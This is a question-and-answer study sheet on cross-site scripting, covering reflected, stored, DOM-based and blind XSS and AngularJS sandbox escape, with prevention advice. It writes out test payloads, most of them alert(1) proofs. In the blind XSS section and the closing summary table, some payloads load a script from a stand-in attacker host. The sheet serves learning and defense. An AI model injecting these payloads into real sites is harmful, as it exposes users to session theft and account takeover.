@@ -1,0 +1,167 @@
+🔹 1. Reflected XSS
+Q1. What is Reflected XSS?
+A: Reflected XSS occurs when malicious input is immediately reflected in the server's response. It typically happens via URL parameters or form submissions.
+
+Q2. How does Reflected XSS work?
+A: The attacker crafts a URL with a malicious script. When a user clicks the link, the script is reflected in the page and executed in the browser.
+
+Example:
+
+php-template
+Copy
+Edit
+http://example.com/search?q=<script>alert(1)</script>
+Q3. How to prevent Reflected XSS?
+A:
+
+Output encoding
+
+Use frameworks that auto-escape (React, Angular)
+
+Set Content Security Policy (CSP)
+
+🔹 2. Stored XSS
+Q4. What is Stored XSS?
+A: Stored XSS is when malicious scripts are permanently stored on the server (e.g., in a database) and served to users — common in comment boxes, profiles, etc.
+
+Q5. Why is Stored XSS more dangerous than Reflected XSS?
+A: It automatically affects every user who views the vulnerable page, including admins — increasing the risk of account takeover or mass exploitation.
+
+Q6. How to prevent Stored XSS?
+A:
+
+Sanitize input on both client and server
+
+Encode output correctly
+
+Use libraries like DOMPurify
+
+Apply strict CSP headers
+
+🔹 3. DOM-based XSS
+Q7. What is DOM-based XSS?
+A: DOM XSS occurs entirely on the client side. JavaScript modifies the DOM using user input (e.g., from location.hash, document.cookie) without proper sanitization.
+
+Q8. Example of DOM XSS?
+html
+Copy
+Edit
+<script>
+  document.getElementById("msg").innerHTML = location.hash;
+</script>
+Payload:
+
+php-template
+Copy
+Edit
+http://example.com/#<img src=x onerror=alert(1)>
+Q9. How to detect and prevent DOM XSS?
+A:
+
+Use safe methods like textContent instead of innerHTML
+
+Avoid eval(), document.write()
+
+Sanitize inputs with DOMPurify
+
+Use browser extensions like DOM Invader (from Burp Suite)
+
+🔹 4. Blind XSS
+Q10. What is Blind XSS?
+A: Blind XSS occurs when your payload executes in a different browser/session (like an admin panel). The attacker doesn’t immediately see the result.
+
+Q11. How do you find Blind XSS?
+A:
+
+Use tools like XSS Hunter or custom webhook endpoints
+
+Inject payloads in less-visible fields (e.g., support tickets, logs)
+
+Monitor for callback on your server
+
+Payload example:
+
+html
+Copy
+Edit
+<script src="https://attacker.com/xss.js"></script>
+Q12. Where is Blind XSS commonly found?
+Admin dashboards
+
+Email logs
+
+Audit logs
+
+Feedback forms
+
+🔹 5. XSS via innerHTML, innerText, DOM Sinks
+Q13. What are DOM sinks?
+A: DOM sinks are JavaScript properties/methods that can reflect or inject user input into the DOM — potentially causing XSS.
+
+Q14. Common vulnerable DOM sinks?
+innerHTML
+
+outerHTML
+
+document.write()
+
+eval()
+
+setTimeout("...")
+
+location.href
+
+Q15. How to secure these DOM sinks?
+A:
+
+Avoid using innerHTML, eval, document.write
+
+Use textContent or createElement() safely
+
+Sanitize input via libraries like DOMPurify
+
+🔹 6. XSS via AngularJS Sandbox Escape
+Q16. What is AngularJS sandbox escape?
+A: Early AngularJS versions (prior to v1.6) used a sandbox to restrict template expression execution. Attackers found ways to escape this and execute arbitrary code.
+
+Q17. What is a typical AngularJS payload?
+A: If user input is embedded in AngularJS expressions:
+
+html
+Copy
+Edit
+{{constructor.constructor('alert(1)')()}}
+Q18. Why is this a serious vulnerability?
+A: If user input is inserted into Angular templates without sanitization, attackers can run any JS code, leading to full client-side compromise.
+
+Q19. How to prevent AngularJS sandbox escape?
+A:
+
+Update to AngularJS v1.6+ (sandbox removed)
+
+Never allow user input in expressions like {{ userInput }}
+
+Use ng-bind instead of interpolation {{}}
+
+Q20. How to test for AngularJS injection?
+A:
+
+Confirm Angular is in use
+
+Inject payloads like:
+
+html
+Copy
+Edit
+{{7*7}}
+{{constructor.constructor('alert(1)')()}}
+Look for execution or parsing behavior
+
+✅ Summary of Key XSS Testing Payloads:
+Context	Payload
+HTML	<script>alert(1)</script>
+Attribute	"><img src=x onerror=alert(1)>
+DOM	#<img src=x onerror=alert(1)>
+AngularJS	{{constructor.constructor('alert(1)')()}}
+Blind XSS	<script src=//attacker.com></script>
+
